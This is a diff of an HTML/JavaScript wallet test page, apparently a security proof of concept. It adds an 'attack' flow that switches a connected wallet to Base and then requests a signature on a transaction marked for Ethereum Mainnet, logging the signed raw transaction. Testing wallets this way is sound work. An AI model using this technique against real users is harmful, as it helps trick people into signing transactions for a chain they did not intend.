@@ -2,15 +2,17 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Chain Switch Test B</title>
+  <title>Auto Chain Switch Sign Test</title>
 </head>
 <body>
-  <h1>Chain Switch Test B</h1>
-  <p>This page tests pre-permission chain switching and approval UI accuracy.</p>
+  <h1>Auto Chain Switch Sign Test</h1>
+  <p>
+    This page automatically switches the wallet to Base, then asks to sign a transaction
+    whose tx.chainId is Ethereum Mainnet.
+  </p>
 
-  <button id="runBase">Run Base Chain Test</button>
-  <button id="runArbitrum">Run Arbitrum Chain Test</button>
-  <button id="txTest">Open 0-value Transaction Prompt</button>
+  <button id="connect">1. Connect</button>
+  <button id="attack">2. Auto-switch to Base + sign tx.chainId 0x1</button>
 
   <pre id="log"></pre>
 
@@ -23,113 +25,76 @@
       console.log(line);
     }
 
-    async function waitEthereum() {
+    async function eth() {
       while (!window.ethereum) {
         await new Promise(r => setTimeout(r, 25));
       }
       return window.ethereum;
     }
 
-    async function runChainTest(chainHex, chainName) {
-      const eth = await waitEthereum();
+    async function getChain() {
+      const provider = await eth();
+      return provider.request({ method: "eth_chainId" });
+    }
 
-      log("=== Testing", chainName, chainHex, "===");
+    async function connect() {
+      const provider = await eth();
+      const accounts = await provider.request({ method: "eth_requestAccounts" });
+      selectedAccount = accounts[0];
+      log("Connected:", selectedAccount);
+      log("Current chain:", await getChain());
+    }
 
-      try {
-        const before = await eth.request({ method: "eth_chainId" });
-        log("Before switch eth_chainId:", JSON.stringify(before));
-      } catch (e) {
-        log("Before chainId error:", e.message || String(e));
+    async function autoSwitchAndSign() {
+      const provider = await eth();
+
+      if (!selectedAccount) {
+        log("No account connected. Click Connect first.");
+        return;
       }
 
+      log("Before auto switch:", await getChain());
+
       try {
-        const switchResult = await eth.request({
+        const switchResult = await provider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: chainHex }]
+          params: [{ chainId: "0x2105" }]
         });
         log("wallet_switchEthereumChain result:", JSON.stringify(switchResult));
       } catch (e) {
         log("wallet_switchEthereumChain error:", e.message || String(e));
-      }
-
-      try {
-        const after = await eth.request({ method: "eth_chainId" });
-        log("After switch eth_chainId:", JSON.stringify(after));
-      } catch (e) {
-        log("After chainId error:", e.message || String(e));
-      }
-
-      try {
-        const accounts = await eth.request({ method: "eth_requestAccounts" });
-        selectedAccount = accounts && accounts[0];
-        log("eth_requestAccounts result:", JSON.stringify(accounts));
-      } catch (e) {
-        log("eth_requestAccounts error:", e.message || String(e));
-      }
-
-      if (!selectedAccount) {
-        log("No selected account; stopping before sign test.");
         return;
       }
 
+      const currentChain = await getChain();
+      log("After auto switch:", currentChain);
+
+      const tx = {
+        from: selectedAccount,
+        to: selectedAccount,
+        value: "0x0",
+        chainId: "0x1",
+        gas: "0x5208"
+      };
+
+      log("Requesting eth_signTransaction with tx.chainId 0x1 while active chain is", currentChain);
+
       try {
-        const sig = await eth.request({
-          method: "personal_sign",
-          params: [
-            "0x48656c6c6f2066726f6d20436861696e205377697463682054657374",
-            selectedAccount
-          ]
+        const signed = await provider.request({
+          method: "eth_signTransaction",
+          params: [tx]
         });
-        log("personal_sign result:", JSON.stringify(sig));
+
+        log("SIGNED_RAW_TX_START");
+        log(signed);
+        log("SIGNED_RAW_TX_END");
       } catch (e) {
-        log("personal_sign error:", e.message || String(e));
+        log("eth_signTransaction error:", e.message || String(e));
       }
     }
 
-    document.getElementById("runBase").onclick = () => {
-      runChainTest("0x2105", "Base");
-    };
-
-    document.getElementById("runArbitrum").onclick = () => {
-      runChainTest("0xa4b1", "Arbitrum");
-    };
-
-    document.getElementById("txTest").onclick = async () => {
-      const eth = await waitEthereum();
-
-      if (!selectedAccount) {
-        try {
-          const accounts = await eth.request({ method: "eth_requestAccounts" });
-          selectedAccount = accounts && accounts[0];
-          log("Connected account:", selectedAccount);
-        } catch (e) {
-          log("Connect error:", e.message || String(e));
-          return;
-        }
-      }
-
-      try {
-        const chain = await eth.request({ method: "eth_chainId" });
-        log("Current chain before tx prompt:", JSON.stringify(chain));
-      } catch (e) {
-        log("chainId error:", e.message || String(e));
-      }
-
-      try {
-        const txHash = await eth.request({
-          method: "eth_sendTransaction",
-          params: [{
-            from: selectedAccount,
-            to: selectedAccount,
-            value: "0x0"
-          }]
-        });
-
-        log("eth_sendTransaction result:", JSON.stringify(txHash));
-      } catch (e) {
-        log("eth_sendTransaction error:", e.message || String(e));
-      }
-    };
+    document.getElementById("connect").onclick = connect;
+    document.getElementById("attack").onclick = autoSwitchAndSign;
   </script>
 </body>
 </html>
